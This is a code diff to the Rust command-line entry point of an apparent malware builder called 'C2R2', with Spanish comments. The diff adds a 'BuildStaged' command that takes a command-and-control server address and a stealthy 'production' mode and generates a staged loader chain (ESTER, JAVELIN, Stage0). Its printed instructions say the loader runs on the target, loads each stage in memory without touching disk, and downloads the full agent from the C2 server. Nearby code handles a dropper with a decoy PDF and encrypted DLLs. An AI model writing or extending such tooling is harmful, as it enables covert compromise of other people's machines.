@@ -3,12 +3,15 @@
 mod dll_encrypt;
 mod encrypt;
 mod patch;
+// mod pe_loader; // Disabled - using donut.exe instead
 mod sc_generator;
+mod stage_builder;
 
 use clap::{Parser, Subcommand};
 use dll_encrypt::{encrypt_dll, generate_random_key, xor_encrypt};
 use encrypt::generate_agent;
 use patch::patch_agent_binary;
+use stage_builder::{build_staged_system, StageConfig};
 use std::env;
 use std::fs;
 use std::path::PathBuf;
@@ -93,6 +96,22 @@ enum Commands {
         /// Archivo PDF de señuelo (opcional, se embebe en el dropper)
         #[arg(short, long)]
         decoy: Option<PathBuf>,
+    },
+
+    /// Construye el sistema multi-stage completo (ESTER→JAVELIN→Stage0)
+    /// Embebe payloads cifrados entre stages para ejecución en memoria
+    BuildStaged {
+        /// Servidor C2 (IP:Puerto)
+        #[arg(short, long)]
+        server: String,
+
+        /// Modo producción (sin consola, sin debug prints, totalmente stealthy)
+        #[arg(short, long)]
+        production: bool,
+
+        /// Directorio de salida para los binarios
+        #[arg(short, long, default_value = "dist")]
+        output: String,
     },
 }
 
@@ -473,6 +492,48 @@ fn main() {
                 }
                 Err(e) => {
                     eprintln!("❌ Error generando dropper: {}", e);
+                    std::process::exit(1);
+                }
+            }
+        }
+
+        Commands::BuildStaged {
+            server,
+            production,
+            output,
+        } => {
+            println!("🔧 C2R2 Multi-Stage Builder v2.0");
+            println!("🌐 Servidor C2: {}", server);
+            println!(
+                "🔒 Modo: {}",
+                if production {
+                    "PRODUCCIÓN (stealthy)"
+                } else {
+                    "DESARROLLO (debug)"
+                }
+            );
+            println!("📂 Output: {}/", output);
+            println!("{}", "-".repeat(50));
+
+            let config = StageConfig {
+                server_address: server,
+                production,
+                output_dir: PathBuf::from(output),
+            };
+
+            match build_staged_system(config) {
+                Ok(ester_path) => {
+                    println!("\n✅ ¡Sistema multi-stage generado exitosamente!");
+                    println!("📦 Ejecutable final: {}", ester_path.display());
+                    println!("\n📋 Para usar:");
+                    println!("   1. Ejecuta {} en el sistema objetivo", ester_path.display());
+                    println!("   2. ESTER validará el entorno");
+                    println!("   3. Cargará JAVELIN en memoria (sin tocar disco)");
+                    println!("   4. JAVELIN cargará Stage0 en memoria");
+                    println!("   5. Stage0 contactará el C2 y descargará el agent completo");
+                }
+                Err(e) => {
+                    eprintln!("❌ Error construyendo sistema multi-stage: {}", e);
                     std::process::exit(1);
                 }
             }
